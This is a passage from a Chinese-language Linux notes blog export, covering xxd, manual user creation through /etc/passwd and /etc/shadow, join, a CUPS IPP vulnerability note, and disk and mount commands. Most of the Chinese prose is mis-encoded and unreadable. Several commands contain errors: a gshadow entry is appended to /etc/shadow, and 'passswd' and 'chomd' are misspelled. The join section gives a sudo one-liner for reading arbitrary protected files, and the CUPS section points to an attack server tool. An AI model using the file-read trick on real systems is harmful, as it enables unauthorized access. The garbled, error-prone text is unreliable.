</tr>
<tr>
<td><code>-g</code></td>
<td>åœ¨æ­£å¸¸è¾“å‡ºæ¨¡å¼ä¸‹ï¼Œæ¯ç»„åŒ…å«çš„å…«ä½å­—èŠ‚æ•°ï¼ˆé»˜è®¤ 2 ä¸ªï¼Œ<code>-e</code> é€‰é¡¹æ—¶é»˜è®¤ 4 ä¸ªï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-h</code></td>
<td>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>ä»¥ C è¯­è¨€æ•°ç»„çš„æ ¼å¼è¾“å‡ºæ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>-l len</code></td>
<td>åœ¨ <code>len</code> ä¸ªå…«ä½å­—èŠ‚ååœæ­¢è½¬å‚¨ã€‚</td>
</tr>
<tr>
<td><code>-o off</code></td>
<td>ä» <code>off</code> åç§»é‡å¼€å§‹è½¬å‚¨æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>-ps</code></td>
<td>ä»¥ <code>postscript</code> æ ¼å¼è¾“å‡ºï¼Œå¹¶åœ¨è¡Œå°¾æ·»åŠ åå…­è¿›åˆ¶è½¬å‚¨å†…å®¹ã€‚</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>é€†å‘æ“ä½œï¼šå°†åå…­è¿›åˆ¶å†…å®¹è½¬æ¢ï¼ˆæˆ–ä¿®è¡¥ï¼‰å›äºŒè¿›åˆ¶æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>-r -s off</code></td>
<td>åœ¨ <code>off</code> åç§»é‡å¤„å¼€å§‹å°†åå…­è¿›åˆ¶å†…å®¹è½¬æ¢å›äºŒè¿›åˆ¶æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>-s [+][-]seek</code></td>
<td>æŒ‡å®š <code>seek</code> åç§»é‡æ¥å¼€å§‹è¯»å–è¾“å…¥æ–‡ä»¶ï¼ˆ<code>+</code> å·è¡¨ç¤ºç›¸å¯¹åç§»ï¼Œ<code>-</code> å·è¡¨ç¤ºè´Ÿåç§»ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>ä½¿ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºåå…­è¿›åˆ¶æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>æ˜¾ç¤º <code>xxd</code> ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚ <code>&quot;xxd V1.10 27oct98 by Juergen Weigert&quot;</code>ã€‚</td>
</tr>
<tr>
<td>-p -r ä¸€èˆ¬å¤Ÿç”¨</td>
<td></td>
</tr>
</tbody></table>
<h2 id="ç”¨-etc-shadow-å’Œ-etc-passwdæ–°å»ºç”¨æˆ·"><a href="#ç”¨-etc-shadow-å’Œ-etc-passwdæ–°å»ºç”¨æˆ·" class="headerlink" title="ç”¨&#x2F;etc&#x2F;shadow å’Œ &#x2F;etc&#x2F;passwdæ–°å»ºç”¨æˆ·"></a>ç”¨&#x2F;etc&#x2F;shadow å’Œ &#x2F;etc&#x2F;passwdæ–°å»ºç”¨æˆ·</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">æ­¥éª¤ï¼šæ–°å»ºçš„ç”¨æˆ·å’Œç»„åæ˜¯ liwuï¼ŒUIDï¼š<span class="number">507</span>ï¼ŒGIDï¼š<span class="number">505</span>Â Â Â Â Â <span class="comment">// ç”¨æˆ·åã€ç»„åã€UID å’Œ GID ä¸å¯å…¶ä»–ç”¨æˆ·å†²çª</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ï¼Œä¿®æ”¹ /etc/passw</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#echo</span> <span class="string">&quot;liwu:x:507:505::/home/liwu:/bin/bash&quot;</span>&gt;&gt;Â /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>, ä¿®æ”¹ /etc/shadow</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#echo</span> <span class="string">&quot;liwu:!!:15917:0:99999:7:::&quot;</span>&gt;&gt;Â /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>, ä¿®æ”¹ /etc/group</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#echo</span> <span class="string">&quot;liwu:x:505:&quot;</span>&gt;&gt;Â /etc/group</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>, ä¿®æ”¹ /etc/gshadow</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#echo</span> <span class="string">&quot;liwu:!::&quot;</span>&gt;&gt;Â /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>, å»ºç«‹ liwu ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œä¿®æ”¹å®¶ç›®å½•çš„æƒé™å’Œæ‰€æœ‰è€…</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#mkdir</span> ./liwu</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#cp</span> ./student/.*./liwuÂ Â Â <span class="comment">// ä»ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„å®¶ç›®å½•çš„éšè—æ–‡ä»¶æ‹·è´åˆ° liwu ç”¨æˆ·çš„å®¶ç›®å½•</span></span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#chown</span> -R liwu:liwu /liwu</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#chmod</span> -R <span class="number">700</span> /liwu</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>, ç»™ liwu ç”¨æˆ·è®¾ç½®å£ä»¤</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#passswd</span> liwu</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>, åˆ‡æ¢åˆ° liwu ç”¨æˆ·</span><br><span class="line"><span class="selector-attr">[root@as5 home]</span><span class="selector-id">#su</span> - liwu</span><br><span class="line"><span class="selector-attr">[liwu@as5 ~]</span>$</span><br><span class="line"></span><br><span class="line">è‡³æ­¤æ·»åŠ ç”¨æˆ·å°±å®Œæˆäº†</span><br></pre></td></tr></table></figure></div>
<h2 id="join"><a href="#join" class="headerlink" title="join"></a>join</h2><p><code>join</code> ç”¨äºæ ¹æ®ä¸¤ä¸ªæ–‡ä»¶çš„<strong>å…±åŒå­—æ®µ</strong>åˆå¹¶è¡Œï¼Œç±»ä¼¼äº SQL çš„ <code>JOIN</code> æ“ä½œã€‚æ–‡ä»¶éœ€æå‰æŒ‰å…±åŒå­—æ®µæ’åºï¼Œå¦åˆ™æ— æ³•æ­£ç¡®åŒ¹é…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">join</span> [é€‰é¡¹] æ–‡ä»¶<span class="number">1</span> æ–‡ä»¶<span class="number">2</span></span><br></pre></td></tr></table></figure></div>
<h4 id="å¸¸è§å‚æ•°åŠç¤ºä¾‹"><a href="#å¸¸è§å‚æ•°åŠç¤ºä¾‹" class="headerlink" title="å¸¸è§å‚æ•°åŠç¤ºä¾‹**"></a>å¸¸è§å‚æ•°åŠç¤ºä¾‹**</h4><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>ä½œç”¨</th>
<th>ç¤ºä¾‹ä»£ç </th>
</tr>
</thead>
<tbody><tr>
<td><code>-t CHAR</code></td>
<td>æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦ï¼ˆé»˜è®¤ç©ºæ ¼ï¼‰</td>
<td><code>join -t &#39;,&#39; file1.csv file2.csv</code></td>
</tr>
<tr>
<td><code>-a FILENUM</code></td>
<td>è¾“å‡ºæœªåŒ¹é…çš„è¡Œï¼ˆ<code>1</code>&#x3D; æ–‡ä»¶ 1ï¼Œ<code>2</code>&#x3D; æ–‡ä»¶ 2ï¼‰</td>
<td><code>join -a1 file1.txt file2.txt</code></td>
</tr>
<tr>
<td><code>-e STRING</code></td>
<td>å°†ç¼ºå¤±å­—æ®µæ›¿æ¢ä¸ºæŒ‡å®šå­—ç¬¦ä¸²</td>
<td><code>join -e &quot;NULL&quot; file1.txt file2.txt</code></td>
</tr>
<tr>
<td><code>-i</code></td>
<td>å¿½ç•¥å­—æ®µå¤§å°å†™</td>
<td><code>join -i file1.txt file2.txt</code></td>
</tr>
<tr>
<td><code>-1 N</code></td>
<td>æŒ‡å®šæ–‡ä»¶ 1 çš„ç¬¬ N åˆ—ä¸ºè¿æ¥å­—æ®µ</td>
<td><code>join -1 2 file1.txt file2.txt</code></td>
</tr>
<tr>
<td><code>-2 N</code></td>
<td>æŒ‡å®šæ–‡ä»¶ 2 çš„ç¬¬ N åˆ—ä¸ºè¿æ¥å­—æ®µ</td>
<td><code>join -2 3 file1.txt file2.txt</code></td>
</tr>
<tr>
<td><code>-o FORMAT</code></td>
<td>è‡ªå®šä¹‰è¾“å‡ºå­—æ®µï¼ˆæ ¼å¼ï¼š<code>æ–‡ä»¶å·.å­—æ®µå·</code>ï¼‰</td>
<td><code>join -o 1.2,2.1 file1.txt file2.txt</code></td>
</tr>
<tr>
<td><code>-v FILENUM</code></td>
<td>ä»…è¾“å‡ºæœªåŒ¹é…çš„è¡Œï¼ˆç±»ä¼¼Â <code>-a</code>Â ä½†æ›´ä¸¥æ ¼ï¼‰</td>
<td><code>join -v1 file1.txt file2.txt</code></td>
</tr>
<tr>
<td>æ‰€ä»¥å¯ä»¥ç”¨-aå‚æ•°è¯»å–ä»»æ„æ–‡ä»¶ï¼Œå› ä¸º-aæ˜¯è¾“å‡ºæœªåŒ¹é…çš„è¡Œ<code>sudo /usr/bin/join -a 2 /dev/null $LFILE</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="631-ippæœåŠ¡"><a href="#631-ippæœåŠ¡" class="headerlink" title="631 ippæœåŠ¡"></a>631 ippæœåŠ¡</h2><p>OpenPrinting CUPSï¼ˆé€šç”¨ Unix æ‰“å°ç³»ç»Ÿï¼‰æ˜¯ä¸ºç±» Unix æ“ä½œç³»ç»Ÿå¼€å‘çš„å¼€æºæ‰“å°ç³»ç»Ÿã€‚å®ƒå…è®¸è®¡ç®—æœºå……å½“æ‰“å°æœåŠ¡å™¨ï¼Œé«˜æ•ˆç®¡ç†æœ¬åœ°å’Œç½‘ç»œæ‰“å°æœºã€‚Cups-Browsed æ˜¯ CUPS ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæµè§ˆç½‘ç»œä¸Šå…¶ä»– CUPS æœåŠ¡å™¨å…±äº«çš„è¿œç¨‹æ‰“å°æœºçš„å®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒå¯ä»¥è‡ªåŠ¨å‘ç°å’Œé…ç½®ç½‘ç»œæ‰“å°æœºï¼Œè®©ç”¨æˆ·æ›´å®¹æ˜“è®¿é—®å’Œä½¿ç”¨ç½‘ç»œä¸Šå…±äº«çš„æ‰“å°èµ„æºï¼Œæ— éœ€æ‰‹åŠ¨è®¾ç½®ã€‚</p>
<p>åœ¨ Cups-Browsed 2.0.1 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªç”± PPDï¼ˆPostScript æ‰“å°æœºæè¿°ï¼‰æ–‡ä»¶ä¸­çš„ FoomaticRIPCommandLine å‚æ•°å¤„ç†ä¸å½“å¼•èµ·çš„é—®é¢˜ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ IPPï¼ˆäº’è”ç½‘æ‰“å°åè®®ï¼‰æœåŠ¡å™¨æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå‘æ˜“å—æ”»å‡»çš„ Cups-Browsed å®ä¾‹å‘é€ç²¾å¿ƒåˆ¶ä½œçš„æ‰“å°æœºä¿¡æ¯ï¼Œç„¶ååœ¨è¿è¡Œæ˜“å—æ”»å‡»çš„ Cups-Browsed çš„ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<br>æ¼æ´ç¼–å·æ˜¯CVE-2024-41777<br><a href="https://github.com/vulhub/evil-ipp-server">https://github.com/vulhub/evil-ipp-server</a></p>
<h2 id="df-h"><a href="#df-h" class="headerlink" title="df -h"></a>df -h</h2><p><code>df -h</code> æ˜¯ Linux ä¸‹ç”¨äºæŸ¥çœ‹ç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µçš„å‘½ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">df</span> -h Filesystem Size Used Avail Use% Mounted on</span> </span><br><span class="line">/dev/sda1 50G 20G 30G 40% / </span><br><span class="line">tmpfs 3.9G 4.0K 3.9G 1% /dev/shm</span><br><span class="line">/dev/sdb1 100G 60G 40G 60% /data</span><br></pre></td></tr></table></figure></div>

<h2 id="fdisk-l"><a href="#fdisk-l" class="headerlink" title="fdisk -l"></a>fdisk -l</h2><p><code>fdisk -l</code> ç”¨äºåˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰ç£ç›˜åŠå…¶åˆ†åŒºä¿¡æ¯ï¼Œå¸¸ç”¨äºæŸ¥çœ‹ç£ç›˜åˆ†åŒºè¡¨ã€‚<br>è¾“å‡ºç¤ºä¾‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">Disk /dev/sda:<span class="number"> 100 </span>GiB,<span class="number"> 107374182400 </span>bytes,<span class="number"> 209715200 </span>sectors</span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 4096 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 4096 </span>bytes /<span class="number"> 4096 </span>bytes</span><br><span class="line">Disklabel type: gpt</span><br><span class="line">Disk identifier: ABCD-1234</span><br><span class="line"></span><br><span class="line">Device      Start       End   Sectors  Size Type</span><br><span class="line">/dev/sda1  <span class="number"> 2048 </span>  <span class="number"> 2099199 </span> <span class="number"> 2097152 </span>   1G EFI System</span><br><span class="line">/dev/sda2  <span class="number"> 2099200 </span><span class="number"> 4196351 </span> <span class="number"> 2097152 </span>   1G Linux swap</span><br><span class="line">/dev/sda3  <span class="number"> 4196352 </span>209715166<span class="number"> 205518815 </span>98G Linux filesystem</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p><code>mount</code> ç”¨äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿï¼Œä½¿å…¶å¯ä»¥è¢«è®¿é—®ã€‚å®ƒå¯ä»¥å°†å­˜å‚¨è®¾å¤‡ï¼ˆå¦‚ç¡¬ç›˜åˆ†åŒºã€U ç›˜ã€ISO é•œåƒç­‰ï¼‰æŒ‚è½½åˆ° Linux æ–‡ä»¶ç³»ç»Ÿçš„æŸä¸ªç›®å½•ä¸‹ã€‚<br>æŒ‚è½½æœ¬åœ°ç£ç›˜åˆ†åŒº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mount /dev/sdb1 /mnt</span><br></pre></td></tr></table></figure></div>
<p><strong>æ³¨æ„</strong>ï¼šæŒ‚è½½å‰ï¼Œè¯·ç¡®ä¿ç›®å½• <code>/mnt</code> å­˜åœ¨ï¼Œå¦åˆ™éœ€è¦å…ˆ <code>mkdir /mnt</code> åˆ›å»ºã€‚<br>umount å¸è½½</p>
<table>
<thead>
<tr>
<th>ç”¨æ³•</th>
<th>å‘½ä»¤</th>
</tr>
</thead>
<tbody><tr>
<td>æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯</td>
<td><code>mount</code></td>
</tr>
<tr>
<td>æŒ‚è½½ç£ç›˜</td>
<td><code>sudo mount /dev/sdb1 /mnt</code></td>
</tr>
<tr>
<td>æŒ‚è½½ ISO</td>
<td><code>sudo mount -o loop image.iso /mnt</code></td>
</tr>
<tr>
<td>åªè¯»æŒ‚è½½</td>
<td><code>sudo mount -o ro /dev/sdb1 /mnt</code></td>
</tr>
<tr>
<td>å¸è½½è®¾å¤‡</td>
<td><code>sudo umount /mnt</code></td>
</tr>
<tr>
<td>å¼ºåˆ¶å¸è½½</td>
<td><code>sudo umount -f /mnt</code></td>
</tr>
<tr>
<td>é…ç½®å¼€æœºè‡ªåŠ¨æŒ‚è½½</td>
<td><code>/etc/fstab</code></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>linux</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>linux</tag>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxåŸºç¡€æŒ‡ä»¤ç¬”è®°</title>
    <url>/posts/11168.html</url>
    <content><![CDATA[<p>linuxåŸºç¡€æŒ‡ä»¤å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>
<p>âš ï¸æœ¬ç¯‡åšå®¢åªæ˜¯æˆ‘åˆšå­¦ä¹ linuxæŒ‡ä»¤æ—¶çš„ç¬”è®°ï¼Œåªç”¨æ¥è‡ªå·±è®°å½•</p>
<h1 id="Linux-ç³»ç»ŸæŒ‡ä»¤"><a href="#Linux-ç³»ç»ŸæŒ‡ä»¤" class="headerlink" title="Linux ç³»ç»ŸæŒ‡ä»¤"></a>Linux ç³»ç»ŸæŒ‡ä»¤</h1><h2 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><ul>
<li><a href="#linux-%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4">Linux ç³»ç»ŸæŒ‡ä»¤</a><ul>
<li><a href="#%E7%9B%AE%E5%BD%95">ç›®å½•</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C">æ–‡ä»¶åŸºç¡€æ“ä½œ</a><ul>
<li><a href="#%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4">æ ¸å¿ƒæŒ‡ä»¤</a><ul>
<li><a href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86">æ–‡ä»¶ç®¡ç†</a></li>
<li><a href="#%E5%86%85%E5%AE%B9%E5%A4%84%E7%90%86">å†…å®¹å¤„ç†</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">æƒé™ç®¡ç†</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9">æƒé™ä¿®æ”¹</a></li>
</ul>
</li>
<li><a href="#shell%E8%84%9A%E6%9C%AC">shellè„šæœ¬</a></li>
<li><a href="#vim-%E5%9F%BA%E7%A1%80">vim åŸºç¡€</a><ul>
<li><a href="#%E8%BF%9B%E5%85%A5%E9%80%80%E5%87%BA%E7%BC%96%E8%BE%91%E6%A8%A1%E5%BC%8F">è¿›å…¥&#x2F;é€€å‡ºç¼–è¾‘æ¨¡å¼</a></li>
<li><a href="#%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87">ç§»åŠ¨å…‰æ ‡</a></li>
<li><a href="#%E5%A4%8D%E5%88%B6%E5%89%AA%E5%88%87%E7%B2%98%E8%B4%B4">å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´</a></li>
<li><a href="#%E6%92%A4%E9%94%80--%E6%81%A2%E5%A4%8D">æ’¤é”€ &amp; æ¢å¤</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E7%BC%A9%E8%BF%9B">ä»£ç ç¼©è¿›</a></li>
<li><a href="#%E7%AA%97%E5%8F%A3--%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86">çª—å£ &amp; æ ‡ç­¾ç®¡ç†</a></li>
<li><a href="#%E7%AA%97%E5%8F%A3%E5%AF%B9%E9%BD%90">çª—å£å¯¹é½</a></li>
<li><a href="#vim-%E9%85%8D%E7%BD%AE">Vim é…ç½®</a></li>
<li><a href="#g%E7%BC%96%E8%AF%91">g++ç¼–è¯‘</a></li>
</ul>
</li>
<li><a href="#%E6%8F%92%E4%BB%B6%E7%AE%A1%E7%90%86">æ’ä»¶ç®¡ç†</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="æ–‡ä»¶åŸºç¡€æ“ä½œ"><a href="#æ–‡ä»¶åŸºç¡€æ“ä½œ" class="headerlink" title="æ–‡ä»¶åŸºç¡€æ“ä½œ"></a>æ–‡ä»¶åŸºç¡€æ“ä½œ</h2><h3 id="æ ¸å¿ƒæŒ‡ä»¤"><a href="#æ ¸å¿ƒæŒ‡ä»¤" class="headerlink" title="æ ¸å¿ƒæŒ‡ä»¤"></a>æ ¸å¿ƒæŒ‡ä»¤</h3><h4 id="æ–‡ä»¶ç®¡ç†"><a href="#æ–‡ä»¶ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç®¡ç†"></a>æ–‡ä»¶ç®¡ç†</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>          <span class="comment"># åˆ—å‡ºç›®å½•å†…å®¹</span></span><br><span class="line"><span class="built_in">ls</span> -l       <span class="comment"># é•¿æ ¼å¼æ˜¾ç¤ºï¼ˆåŒ…å«æƒé™ä¿¡æ¯ï¼‰</span></span><br><span class="line"><span class="built_in">ls</span> -a       <span class="comment"># æ˜¾ç¤ºéšè—æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">cd</span> ~        <span class="comment"># è¿”å›ç”¨æˆ·ç›®å½•</span></span><br><span class="line"><span class="built_in">pwd</span>         <span class="comment"># æ˜¾ç¤ºå½“å‰è·¯å¾„</span></span><br><span class="line"><span class="built_in">cat</span> file    <span class="comment"># æŸ¥çœ‹æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="built_in">cp</span> src.txt dest/          <span class="comment"># å¤åˆ¶æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">cp</span> -R <span class="built_in">dir</span>/ dest/          <span class="comment"># å¤åˆ¶ç›®å½•éœ€è¦-Rå‚æ•°</span></span><br><span class="line"><span class="built_in">mv</span> old.txt new.txt        <span class="comment"># é‡å‘½åæ–‡ä»¶</span></span><br><span class="line"><span class="built_in">mkdir</span> project             <span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line"><span class="built_in">rmdir</span> empty_dir           <span class="comment"># åˆ é™¤ç©ºç›®å½•</span></span><br><span class="line"><span class="built_in">rm</span> -rf temp/              <span class="comment">#å¼ºåˆ¶é€’å½’åˆ é™¤ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤„ç†å«ç©ºæ ¼æ–‡ä»¶å</span></span><br><span class="line"><span class="built_in">touch</span> <span class="string">&quot;file name.txt&quot;</span>     <span class="comment"># åˆ›å»ºå¸¦ç©ºæ ¼æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">ls</span> file\ name.txt         <span class="comment"># è½¬ä¹‰ç©ºæ ¼æŸ¥çœ‹</span></span><br></pre></td></tr></table></figure></div>
<h4 id="å†…å®¹å¤„ç†"><a href="#å†…å®¹å¤„ç†" class="headerlink" title="å†…å®¹å¤„ç†"></a>å†…å®¹å¤„ç†</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STAN"><figure class="iseeu highlight /stan"><table><tr><td class="code"><pre><span class="line">wc -l access.<span class="built_in">log</span>          <span class="comment"># ç»Ÿè®¡è¡Œæ•°</span></span><br><span class="line">diff file1 file2          <span class="comment"># æ–‡ä»¶å·®å¼‚å¯¹æ¯”</span></span><br><span class="line"><span class="built_in">head</span> -n <span class="number">20</span> <span class="built_in">log</span>.txt        <span class="comment"># æŸ¥çœ‹å‰20è¡Œ</span></span><br><span class="line"><span class="built_in">tail</span> -f service.<span class="built_in">log</span>       <span class="comment"># å®æ—¶è¿½è¸ªæ—¥å¿—æ›´æ–°</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> *.<span class="built_in">log</span>        <span class="comment"># å¤šæ–‡ä»¶å…³é”®è¯æœç´¢</span></span><br></pre></td></tr></table></figure></div>
<h4 id="æƒé™ç®¡ç†"><a href="#æƒé™ç®¡ç†" class="headerlink" title="æƒé™ç®¡ç†"></a>æƒé™ç®¡ç†</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">-rw-r--r-- <span class="number">1</span> <span class="keyword">user</span> <span class="title">group</span> <span class="number">4096</span> Jan <span class="number">1</span> <span class="number">00</span>:<span class="number">00</span> file.txt</span><br><span class="line"><span class="comment"># ç¬¬1ä½ï¼šæ–‡ä»¶ç±»å‹ï¼ˆ-æ™®é€šæ–‡ä»¶ï¼Œdç›®å½•ï¼‰</span></span><br><span class="line"><span class="comment"># 2-4ä½ï¼šç”¨æˆ·æƒé™ï¼ˆrw-ï¼‰</span></span><br><span class="line"><span class="comment"># 5-7ä½ï¼šç»„æƒé™ï¼ˆr--ï¼‰</span></span><br><span class="line"><span class="comment"># 8-10ä½ï¼šå…¶ä»–ç”¨æˆ·æƒé™ï¼ˆr--ï¼‰</span></span><br></pre></td></tr></table></figure></div>
<h4 id="æƒé™ä¿®æ”¹"><a href="#æƒé™ä¿®æ”¹" class="headerlink" title="æƒé™ä¿®æ”¹"></a>æƒé™ä¿®æ”¹</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x script.sh      <span class="comment"># æ·»åŠ ç”¨æˆ·æ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="built_in">chmod</span> go-w secret.txt    <span class="comment"># ç§»é™¤ç»„å’Œå…¶ä»–å†™æƒé™</span></span><br><span class="line"><span class="built_in">chmod</span> 755 executable     <span class="comment"># æ•°å­—æ¨¡å¼æƒé™è®¾ç½®ï¼ˆrwxr-xr-xï¼‰</span></span><br><span class="line">chomd 600  id_rsa        <span class="comment"># ä»…æ–‡ä»¶æ‰€æœ‰è€…å¯è¯»å†™ï¼Œå…¶ä»–äººæ— æƒé™</span></span><br></pre></td></tr></table></figure></div>
<h3 id="shellè„šæœ¬"><a href="#shellè„šæœ¬" class="headerlink" title="shellè„šæœ¬"></a>shellè„šæœ¬</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Shell è„šæœ¬åŸºç¡€ç¤ºä¾‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡èµ‹å€¼ä¸å¼•ç”¨</span></span><br><span class="line">VAR=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;å˜é‡å†…å®¹ï¼š<span class="variable">$VAR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–ç”¨æˆ·è¾“å…¥</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;è¯·è¾“å…¥ä½ çš„åå­—ï¼š&quot;</span> name</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ä½ å¥½ï¼Œ<span class="variable">$name</span>ï¼&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘½ä»¤è¡Œå‚æ•°å¤„ç†</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ‰§è¡Œè„šæœ¬åï¼š<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;å‚æ•°ä¸ªæ•°ï¼š<span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ‰€æœ‰å‚æ•°ï¼š<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¡ä»¶åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;é”™è¯¯ï¼šç¼ºå°‘å‚æ•°ï¼&quot;</span></span><br><span class="line"><span class="keyword">elif</span> 